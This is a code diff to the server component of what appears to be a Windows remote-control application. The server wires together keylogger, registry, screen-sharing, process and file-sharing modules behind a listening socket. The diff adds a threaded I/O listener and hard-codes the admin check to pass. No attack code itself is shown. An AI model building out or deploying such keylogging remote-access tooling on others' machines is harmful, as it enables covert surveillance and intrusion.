@@ -1,7 +1,6 @@
 from ServerSocket import ServerSocket
 from KeyLogger import KeyLogger
 from Window import OS
-from IO import IO
 from Registry import Registry
 from Screen import Screen
 from Process import Process
@@ -9,7 +8,9 @@ from Application import Application
 from Network import Network
 from SysTrayIcon import SysTrayIcon
 from ShareFile import ShareFile
+from ServerIO import ServerIO
 from ctypes import windll
+import threading
 
 import itertools
 import glob
@@ -24,7 +25,7 @@ ADDR = (HOST, PORT)
 
 class ServerApp:
     def __init__(self):
-        if self.is_admin():
+        if True:  # self.is_admin():
             self.setup()
 
         else:
@@ -56,6 +57,7 @@ class ServerApp:
         self.server.bind(ADDR)
         self.server.listen(1)
 
+        self.server_io = ServerIO()
         self.key_logger = KeyLogger(self.server)
         self.os = OS()
         self.registry = Registry(self.server)
@@ -64,12 +66,12 @@ class ServerApp:
         self.application = Application(self.server)
         self.network = Network(self.server)
         self.share_file = ShareFile(self.server)
-        self.io = IO(self.server)
 
         self.start_listening(sysTrayIcon)
 
     def start_listening(self, sysTrayIcon):
         try:
+            threading.Thread(target=self.server_io.start_listening).start()
             addr = self.server.accept()
             sysTrayIcon.hover_text = "Connected by " + addr
             sysTrayIcon.refresh_icon()
@@ -78,7 +80,6 @@ class ServerApp:
 
             listeners = [
                 self.share_file.start_listening,  # DONE
-                self.io.start_listening,  # DONE
                 self.key_logger.start_listening,  # DONE
                 self.os.start_listening,  # DONE
                 self.registry.start_listening,  # DONE
@@ -104,6 +105,7 @@ class ServerApp:
             sysTrayIcon.refresh_icon()
 
             self.screen.close_screen_share()
+            self.server_io.stop()
             self.key_logger.stop()
             self.start_listening(sysTrayIcon)
 
@@ -114,6 +116,7 @@ class ServerApp:
         try:
             self.screen.close_screen_share()
             self.key_logger.stop()
+            self.server_io.close()
             self.server.close()
         except:
             pass
